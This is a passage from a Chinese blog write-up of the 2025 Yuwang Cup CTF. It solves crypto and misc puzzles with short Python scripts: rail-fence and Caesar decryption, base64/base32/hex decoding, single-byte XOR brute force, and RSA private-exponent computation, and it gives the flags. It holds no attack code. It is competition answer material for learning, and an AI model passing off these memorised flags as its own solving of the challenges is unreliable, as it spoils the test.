+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_fence_cipher</span>(<span class="params">ciphertext, num_rails</span>):</span><br><span class="line">    rail_length = <span class="built_in">len</span>(ciphertext) // num_rails</span><br><span class="line">    extra_chars = <span class="built_in">len</span>(ciphertext) % num_rails</span><br><span class="line">    rails = [<span class="string">&#x27;&#x27;</span>] * num_rails</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_rails):</span><br><span class="line">        <span class="keyword">if</span> i &lt; extra_chars:</span><br><span class="line">            rails[i] = ciphertext[index:index + rail_length + <span class="number">1</span>]</span><br><span class="line">            index += rail_length + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rails[i] = ciphertext[index:index + rail_length]</span><br><span class="line">            index += rail_length</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rail_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> rail <span class="keyword">in</span> rails:</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(rail):</span><br><span class="line">                plaintext += rail[i]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_fence_cipher</span>(<span class="params">ciphertext, min_rails, max_rails</span>):</span><br><span class="line">    <span class="keyword">for</span> num_rails <span class="keyword">in</span> <span class="built_in">range</span>(min_rails, max_rails + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = decrypt_fence_cipher(ciphertext, num_rails)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[栏数 <span class="subst">&#123;num_rails:2d&#125;</span>] 解密结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[栏数 <span class="subst">&#123;num_rails:2d&#125;</span>] 出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">ciphertext = <span class="string">&quot;k9qrfSl6&#123;uOV78pW32iXQ&#125;&quot;</span></span><br><span class="line">test_fence_cipher(ciphertext, <span class="number">2</span>, <span class="number">20</span>)</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下,其中 kqfl{O7p3iQ9rS6uV8W2X}最可疑,很像flag的形式</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234603259-0d10e0bf-39a2-424a-b2e2-3d8c3952977c.png"></p>
+<p>之后进行凯撒解密,解密代码如下,当偏移量为5的时候才正确,并且保持数字不动</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> char == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            decrypted_text += char</span><br><span class="line">        <span class="keyword">elif</span> char.isalpha():</span><br><span class="line">            offset = <span class="number">65</span> <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="number">97</span></span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - offset - shift) % <span class="number">26</span> + offset)</span><br><span class="line">            decrypted_text += decrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted_text += char</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line">cipher_text = <span class="string">&quot;kqfl&#123;O7p3iQ9rS6uV8W2X&#125;&quot;</span></span><br><span class="line">shift = <span class="number">5</span></span><br><span class="line">plain_text = caesar_decrypt(cipher_text, shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的文本: <span class="subst">&#123;plain_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3.找到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234603756-c3b5c4b1-a83f-4070-80b4-918481cd9872.png"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto-easy-签到题"><a href="#Crypto-easy-签到题" class="headerlink" title="Crypto easy-签到题"></a>Crypto easy-签到题</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234590627-dd7ca80e-cac2-4183-acf2-bf00c0ac941f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234590939-1ce0a757-9eb5-4ae4-85d0-792d9cc6d105.png"></p>
+<p>二、解题思路（要求解题思路清晰,每个题需截图flag值并且包含时间）</p>
+<p>1.获取到解题文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591238-59eb681b-321d-48c1-af18-6439e76bdc9e.png"></p>
+<p>2.然后利用Detect It Easy工具发现这个是文本格式</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591518-69b85994-338a-41ce-98a5-5d9653e06aa2.png"></p>
+<p>3.发现这个编码像base64</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591781-65d0d9dc-6376-45ce-9f44-08d6029636ff.png"></p>
+<p>4.cyberchef进行解码</p>
+<p>base64解码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592053-8d53d7b0-dd72-4caa-9b41-7103d200da67.png"></p>
+<p>再base32解码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592321-a9f2464b-5358-4bef-b776-24f3dead6821.png"></p>
+<p>发现是一串神奇的数字,很像16进制字符串,再进行16进制解码就行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592570-22636e64-6ca0-4bd3-974b-a64e57f30fe7.png"></p>
+<h2 id="Misc-ez-xor"><a href="#Misc-ez-xor" class="headerlink" title="Misc ez_xor"></a>Misc ez_xor</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604156-f0e56a79-8b3f-49fc-9ec0-8c2ca2816c69.png"></p>
+<ol>
+<li>解题思路</li>
+</ol>
+<p>1.看文件内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604466-f47831f8-0298-42b6-a0e1-f69b92a3aa61.png"></p>
+<p>2、写解密代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x5f</span>, <span class="number">0x55</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x42</span>, <span class="number">0x71</span>, <span class="number">0x7a</span>, <span class="number">0x6d</span>,</span><br><span class="line">        <span class="number">0x7f</span>, <span class="number">0x48</span>, <span class="number">0x4e</span>, <span class="number">0x5c</span>, <span class="number">0x78</span>, <span class="number">0x6a</span>, <span class="number">0x7d</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x0e</span>, <span class="number">0x44</span>]</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b ^ key) <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">for</span> c <span class="keyword">in</span> result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key = <span class="subst">&#123;key&#125;</span>,<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>3.得到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604970-f9f0d871-e564-4d12-a639-fb6f127018a5.png"></p>
+<h2 id="cry-rsa"><a href="#cry-rsa" class="headerlink" title="cry_rsa"></a>cry_rsa</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234605381-93a8135d-dc3d-4c85-b8a1-60aae0ad9658.png"></p>
+<ol>
+<li>解题思路</li>
+</ol>
+<p>1.分析题目</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234605637-04e198c8-fd4f-4dda-a02a-8a9b81db0206.png">2.写解密函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    gcd, x1, y1 = extended_gcd(b, a % b)</span><br><span class="line">    x = y1</span><br><span class="line">    y = x1 - (a // b) * y1</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">e, phi_n</span>):</span><br><span class="line">    gcd, x, y = extended_gcd(e, phi_n)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;e 和 φ(n) 不互质,无法求模逆&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % phi_n</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">flag = d + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>得到flag</li>
+</ol>
+<p>flag:flag{2023326077889096383}</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606117-98c78d87-b5ac-49fc-ad05-65fdd26acadd.png"></p>
+<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606447-6d18c3cc-8d5d-4e15-973a-e6d071ba473c.png"></p>
+<p>二、解题思路</p>
+<p>题目说 1&#x2F;4的礼物是1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + …</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606750-f66cd1f5-2736-4da8-ae43-ccffc0137614.png"></p>
+<p>这1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + … 明显是π&#x2F;4,再乘4就是π,签到题</p>
+<p>flag{pie},偏移量为2,所以flag为flag{rkg},不用工具,心算凯撒就行</p>
+<p>3.解出flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606989-cc201cd3-421a-43b6-b106-8d08726f0f8f.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io">Fischl0527</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/">https://fischl0527.github.io/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Compete/">Compete</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img class="cover" src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">十六届蓝桥杯CTF</div></div></div></a><a class="pagination-related  no-desc" href="/2025/07/06/BUUWEB/" title="BUUWEB(持续学习中)"><img class="cover" src="/img/cover/%E9%87%8D%E8%B5%B0BUUWEB%E8%B7%AF.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">BUUWEB(持续学习中)</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img class="cover" src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-26</div><div class="info-item-2">十六届蓝桥杯CTF</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fischl0527</div><div class="author-info-description">��������ȥ׷Ѱ���塣ҹɫ����λ����š���</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fischl0527"><i class="fab fa-github"></i><span>Fischl0527</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Fischl0527" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1587607874@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog. I am a CTFer. Welcome everyone!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%92%E5%90%8D%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.</span> <span class="toc-text">排名及解题情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-number">2.1.</span> <span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YWB-Web-xff"><span class="toc-number">2.2.</span> <span class="toc-text">YWB_Web_xff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YWB-Web-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.3.</span> <span class="toc-text">YWB_Web_未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YWB-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">YWB_Web_命令执行过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YWB-Web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text">YWB_Web_反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%89%E9%9A%99%E4%B8%AD%E7%9A%84%E5%AF%84%E7%94%9F%E5%AF%86%E9%92%A5"><span class="toc-number">3.1.</span> <span class="toc-text">光隙中的寄生密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc%E8%8D%89%E7%94%B8%E6%96%B9%E9%98%B5%E7%9A%84%E5%AF%86%E8%AF%AD"><span class="toc-number">3.2.</span> <span class="toc-text">misc草甸方阵的密语</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-easy-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">Crypto easy-签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-ez-xor"><span class="toc-number">4.2.</span> <span class="toc-text">Misc ez_xor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cry-rsa"><span class="toc-number">4.3.</span> <span class="toc-text">cry_rsa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gift"><span class="toc-number">4.4.</span> <span class="toc-text">gift</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/06/BUUWEB/" title="BUUWEB(持续学习中)"><img src="/img/cover/%E9%87%8D%E8%B5%B0BUUWEB%E8%B7%AF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUWEB(持续学习中)"/></a><div class="content"><a class="title" href="/2025/07/06/BUUWEB/" title="BUUWEB(持续学习中)">BUUWEB(持续学习中)</a><time datetime="2025-07-06T03:45:14.000Z" title="Created 2025-07-06 11:45:14">2025-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp"><img src="/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025御网杯wp"/></a><div class="content"><a class="title" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp">2025御网杯wp</a><time datetime="2025-05-11T03:45:14.000Z" title="Created 2025-05-11 11:45:14">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="十六届蓝桥杯CTF"/></a><div class="content"><a class="title" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF">十六届蓝桥杯CTF</a><time datetime="2025-04-26T03:45:14.000Z" title="Created 2025-04-26 11:45:14">2025-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp"><img src="/img/cover/2025sqCTF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025sqCTFwp"/></a><div class="content"><a class="title" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp">2025sqCTFwp</a><time datetime="2025-04-04T03:45:14.000Z" title="Created 2025-04-04 11:45:14">2025-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp"><img src="/img/cover/2025GHCTFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025GHCTFwp"/></a><div class="content"><a class="title" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp">2025GHCTFwp</a><time datetime="2025-03-21T03:45:14.000Z" title="Created 2025-03-21 11:45:14">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/HnuSecTraining/2025SpringWeek2/" title="2025 Spring Week2"><img src="/img/cover/2025SpringWeek2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025 Spring Week2"/></a><div class="content"><a class="title" href="/2025/03/18/HnuSecTraining/2025SpringWeek2/" title="2025 Spring Week2">2025 Spring Week2</a><time datetime="2025-03-18T03:45:14.000Z" title="Created 2025-03-18 11:45:14">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Fischl0527</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
